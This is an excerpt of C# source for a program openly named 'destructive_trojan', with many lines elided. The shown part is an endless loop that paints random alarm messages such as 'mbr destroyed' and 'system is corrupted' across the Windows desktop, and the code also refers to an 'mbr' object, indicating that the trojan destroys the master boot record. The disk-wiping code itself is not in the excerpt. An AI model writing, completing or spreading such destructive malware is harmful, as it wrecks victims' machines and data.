...
namespace destructive_trojan
{
    public class Class1
    {
        ...
        public static void Main()
        {
            ...
            //THREADS
            Class1 mbr_nonstatic = new Class1();
            ...
            for(; ; )
            {
                ...
                else
                {
                    ...
                    using (Graphics g = Graphics.FromHdc(desktop))
                    {
                        ...
                        String text2 = "system is corrupted";
                        String text3 = "th1s is cr4zy";
                        String text4 = "OMG";
                        String text5 = "mbr destroyed";
                        ...
                        if(r.Next(5) == 0)
                        {
                            g.DrawString(text1, drawFont, drawBrush, xp, yp, drawFormat);
                        }
                        if (r.Next(5) == 1)
                        {
                            g.DrawString(text2, drawFont, drawBrush, xp, yp, drawFormat);
                        }
                        if (r.Next(5) == 2)
                        {
                            g.DrawString(text3, drawFont, drawBrush, xp, yp, drawFormat);
                        }
                        if (r.Next(5) == 3)
                        {
                            g.DrawString(text4, drawFont, drawBrush, xp, yp, drawFormat);
                        }
                        if (r.Next(5) == 4)
                        {
                            g.DrawString(text5, drawFont, drawBrush, xp, yp, drawFormat);
                        }
                        ReleaseDC(IntPtr.Zero, desktop);
                        Thread.Sleep(9);
                    }
